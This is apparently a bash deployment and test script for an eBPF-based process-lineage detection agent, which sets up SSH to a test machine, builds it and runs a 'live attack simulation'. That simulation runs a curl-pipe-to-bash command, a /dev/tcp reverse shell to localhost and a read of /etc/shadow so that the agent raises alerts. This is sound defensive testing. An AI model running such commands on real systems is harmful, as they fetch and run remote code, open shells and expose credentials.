#!/bin/bash
# Project SENTINEL Deployment & Test Script
# Sets up SSH access to Arch Linux test PC, transfers files, runs test suite

set -euo pipefail

# ─── Configuration ───
ARCH_HOST="${ARCH_HOST:-arch-test.local}"
ARCH_USER="${ARCH_USER:-void}"
ARCH_SSH_PORT="${ARCH_SSH_PORT:-22}"
SSH_KEY="${SSH_KEY:-$HOME/.ssh/id_ed25519}"
PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
REMOTE_PROJECT_DIR="/opt/sentinel"

# ─── Colors ───
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "${CYAN}[*]${NC} $1"; }
ok() { echo -e "${GREEN}[✓]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err() { echo -e "${RED}[✗]${NC} $1"; }

# ─── Check Prerequisites ───
check_prereqs() {
    log "Checking prerequisites..."
    
    command -v ssh >/dev/null || { err "ssh not found"; exit 1; }
    command -v rsync >/dev/null || { err "rsync not found"; exit 1; }
    command -v ssh-keygen >/dev/null || { err "ssh-keygen not found"; exit 1; }
    
    if [[ ! -d "/lib/modules/$(uname -r)/build" ]]; then
        warn "Kernel headers not found - eBPF compilation may fail"
    fi
    
    python3 -c "import bcc" 2>/dev/null || { warn "BCC not installed - run: pip install bcc"; }
    
    ok "Prerequisites checked"
}

# ─── Setup SSH Key ───
setup_ssh() {
    log "Setting up SSH access to $ARCH_HOST..."
    
    if [[ ! -f "$SSH_KEY" ]]; then
        log "Generating SSH key..."
        ssh-keygen -t ed25519 -f "$SSH_KEY" -N "" -C "sentinel-lineage-deploy"
    fi
    
    log "Copying SSH key to $ARCH_USER@$ARCH_HOST..."
    ssh-copy-id -i "$SSH_KEY.pub" -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" || {
        warn "ssh-copy-id failed, trying manual..."
        ssh -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys" < "$SSH_KEY.pub"
    }
    
    ssh -i "$SSH_KEY" -p "$ARCH_SSH_PORT" -o ConnectTimeout=10 "$ARCH_USER@$ARCH_HOST" "echo 'SSH OK'" && ok "SSH connection verified" || { err "SSH connection failed"; exit 1; }
}

# ─── Prepare Remote Environment ───
prepare_remote() {
    log "Preparing remote Arch environment..."
    
    ssh -i "$SSH_KEY" -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" << 'REMOTE_EOF'
        set -euo pipefail
        
        echo "[*] Installing dependencies..."
        sudo pacman -Sy --noconfirm --needed \
            linux-headers \
            bcc \
            python-bcc \
            python-psutil \
            python-yaml \
            python-requests \
            python-geoip2 \
            geoip2-database \
            clang \
            llvm \
            2>/dev/null || true
        
        pip install --user --break-system-packages \
            psutil pyyaml requests geoip2 flask flask-cors bcc 2>/dev/null || true
        
        mkdir -p ~/Documents/Sentinel/{ebpf,agent,collector,config,tests,deploy}
        
        sudo modprobe bpf 2>/dev/null || true
        sudo mount -t debugfs none /sys/kernel/debug 2>/dev/null || true
        sudo mount -t tracefs none /sys/kernel/tracing 2>/dev/null || true
        
        echo "[*] Verifying eBPF support..."
        sudo bcc-tools 2>/dev/null | head -5 || warn "BCC tools verification failed"
        
        echo "[*] Remote environment ready"
REMOTE_EOF
    
    ok "Remote environment prepared"
}

# ─── Transfer Files ───
transfer_files() {
    log "Transferring Project SENTINEL project..."

    rsync -avz --delete \
        -e "ssh -i $SSH_KEY -p $ARCH_SSH_PORT" \
        --exclude='.venv' --exclude='__pycache__' --exclude='*.pyc' --exclude='.git' \
        --exclude='build' --exclude='*.o' \
        "$PROJECT_DIR/" "$ARCH_USER@$ARCH_HOST:$REMOTE_PROJECT_DIR/"

    ok "Files transferred"
}

# ─── Build eBPF Program ───
build_ebpf() {
    log "Building eBPF program on remote..."

    ssh -i "$SSH_KEY" -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" << 'REMOTE_EOF'
        cd ~/Documents/Sentinel

        echo "[*] Building with Makefile..."
        make build

        echo "[✓] eBPF build complete"
REMOTE_EOF

    ok "eBPF build verified"
}

# ─── Run Test Suite ───
run_tests() {
    log "Running test suite on remote..."
    
    ssh -i "$SSH_KEY" -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" << 'REMOTE_EOF'
        cd ~/Documents/Sentinel
        
        echo "[*] Running Python lineage tests..."
        python3 tests/test_lineage.py
        
        echo "[✓] All tests passed"
REMOTE_EOF
    
    ok "Test suite passed"
}

# ─── Start Agent (Background) ───
start_agent() {
    log "Starting Project SENTINEL Agent on remote (background)..."
    log "Note: Agent requires root for eBPF. Run manually with sudo on target:"
    log "  sudo python3 agent/sentinel_lineage_agent.py"
    log "  python3 collector/sentinel_hub_lineage.py"
    
    ssh -i "$SSH_KEY" -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" << 'REMOTE_EOF'
        cd ~/Documents/Sentinel
        
        pkill -f sentinel_lineage_agent.py 2>/dev/null || true
        pkill -f sentinel_hub_lineage.py 2>/dev/null || true
        sleep 1
        
        # Start collector hub (user-space)
        echo "[*] Starting collector hub on :5000..."
        nohup python3 collector/sentinel_hub_lineage.py > /tmp/sentinel_hub.log 2>&1 &
        HUB_PID=$!
        echo $HUB_PID > /tmp/sentinel_hub.pid
        sleep 2
        
        echo "[✓] Hub started: PID=$HUB_PID"
        echo "[*] Hub UI: http://$ARCH_HOST:5000"
        echo "[*] To start agent (needs root): sudo python3 agent/sentinel_lineage_agent.py"
        echo "[*] Logs: tail -f /tmp/sentinel_hub.log"
REMOTE_EOF
    
    ok "Collector hub started on remote"
}

# ─── Run Live Test ───
run_live_test() {
    log "Running live attack simulation (requires agent running with sudo)..."
    
    ssh -i "$SSH_KEY" -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" << 'REMOTE_EOF'
        cd ~/Documents/Sentinel
        
        echo "[*] Test 1: Benign process..."
        sleep 1
        /bin/ls -la /
        sleep 1
        
        echo "[*] Test 2: Pipe execute pattern..."
        timeout 2 bash -c 'curl -s http://httpbin.org/get | bash' 2>/dev/null || true
        sleep 2
        
        echo "[*] Test 3: Reverse shell pattern..."
        timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>/dev/null || true
        sleep 2
        
        echo "[*] Test 4: Shadow access (needs sudo)..."
        sudo timeout 2 cat /etc/shadow 2>/dev/null || true
        sleep 2
        
        echo "[*] Checking alerts..."
        curl -s http://localhost:5000/api/v1/telemetry | python3 -m json.tool | head -50
        
        echo "[*] Checking lineage trees..."
        curl -s http://localhost:5000/api/v1/lineage | python3 -m json.tool
        
        echo "[✓] Live test complete"
REMOTE_EOF
    
    ok "Live test executed"
}

# ─── Show Results ───
show_results() {
    log "Fetching results from remote..."
    
    ssh -i "$SSH_KEY" -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" << 'REMOTE_EOF'
        echo "=== SENTINEL LINEAGE AGENT LOGS ==="
        tail -30 /tmp/sentinel_agent.log 2>/dev/null || echo "No agent logs (agent not started)"
        
        echo ""
        echo "=== COLLECTOR HUB LOGS ==="
        tail -30 /tmp/sentinel_hub.log 2>/dev/null || echo "No hub logs"
        
        echo ""
        echo "=== STATS ==="
        curl -s http://localhost:5000/api/v1/stats | python3 -m json.tool
        
        echo ""
        echo "=== LINEAGE TREES ==="
        curl -s http://localhost:5000/api/v1/lineage | python3 -m json.tool
REMOTE_EOF
}

# ─── Cleanup ───
cleanup() {
    log "Cleaning up remote processes..."
    
    ssh -i "$SSH_KEY" -p "$ARCH_SSH_PORT" "$ARCH_USER@$ARCH_HOST" << 'REMOTE_EOF' 2>/dev/null || true
        pkill -f sentinel_lineage_agent.py 2>/dev/null || true
        pkill -f sentinel_hub_lineage.py 2>/dev/null || true
        echo "[✓] Cleanup complete"
REMOTE_EOF
}

# ─── Main ───
main() {
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║       SENTINEL LINEAGE DEPLOYMENT & TEST RUNNER              ║"
    echo "║       Target: $ARCH_USER@$ARCH_HOST:$ARCH_SSH_PORT"
    echo "╚══════════════════════════════════════════════════════════════╝"
    
    case "${1:-all}" in
        ssh) check_prereqs; setup_ssh ;;
        prep) prepare_remote ;;
        sync) transfer_files ;;
        build) build_ebpf ;;
        test) run_tests ;;
        start) start_agent ;;
        live) run_live_test ;;
        results) show_results ;;
        cleanup) cleanup ;;
        all)
            check_prereqs
            setup_ssh
            prepare_remote
            transfer_files
            build_ebpf
            run_tests
            start_agent
            run_live_test
            show_results
            ;;
        *) echo "Usage: $0 {ssh|prep|sync|build|test|start|live|results|cleanup|all}"; exit 1 ;;
    esac
}

main "$@"
